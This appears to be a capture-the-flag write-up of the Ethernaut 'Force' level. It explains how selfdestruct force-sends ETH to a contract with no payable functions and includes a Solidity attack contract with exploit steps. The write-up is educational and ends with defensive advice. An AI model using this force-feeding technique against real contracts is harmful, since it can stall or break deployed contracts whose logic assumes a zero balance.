# Level 7: Force

**Difficulty:** Easy

**Vulnerability:** A contract cannot prevent receiving ETH sent via `selfdestruct`

## How it Works

The Force contract is completely empty. No functions, no `fallback`, no `receive`. The goal is to get its balance above zero.

```solidity
contract Force {/*

                   MEOW ?
         /\_____/\
        /  o   o  \
       ( ==  ^  == )
        )         (
       (           )
      ( (  )   (  ) )
     (__(__)___(__)__)

*/}
```

Sending ETH to it normally fails immediately. Without a `receive` or `payable fallback`, any transaction that tries to send ETH reverts.

The trick is `selfdestruct`. When a contract calls `selfdestruct(targetAddress)`, the EVM destroys the calling contract and forcibly transfers all its ETH to `targetAddress`. This transfer bypasses the recipient completely. There is no function call, no `receive`, no `fallback`. The ETH just arrives.

## Exploit Steps

1. Deploy an attack contract funded with at least 1 wei, passing the Force instance address as the target.
2. Call `attack()` to trigger `selfdestruct`, which sends all ETH in the attack contract to Force.
3. Verify the balance:
```js
await getBalance(instance)
// returns a non-zero value
```
4. Submit the instance.

## Exploit Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    address public owner;
    address public target;

    constructor(address _owner, address _target) payable {
        owner = _owner;
        target = _target;
    }

    function attack() public {
        require(msg.sender == owner, "not owner");
        selfdestruct(payable(target));
    }
}
```

Deploy with the `Value` field set to at least 1 wei in Remix. Pass `player` as `_owner` and `instance` as `_target`. Then call `attack()`.

## Key Takeaway

There is no way for a contract to block ETH sent via `selfdestruct`. The EVM bypasses all receive and fallback logic entirely.

This means any contract logic that relies on `address(this).balance == 0` being true can be broken by an attacker. For example, a contract that only unlocks after its balance hits zero can be permanently stalled by force-feeding it 1 wei.

Never write contract logic that assumes you control your own balance. Treat `address(this).balance` as something an external party can always increment.

**Vulnerability category:** Forceful ETH injection / Improper balance assumption
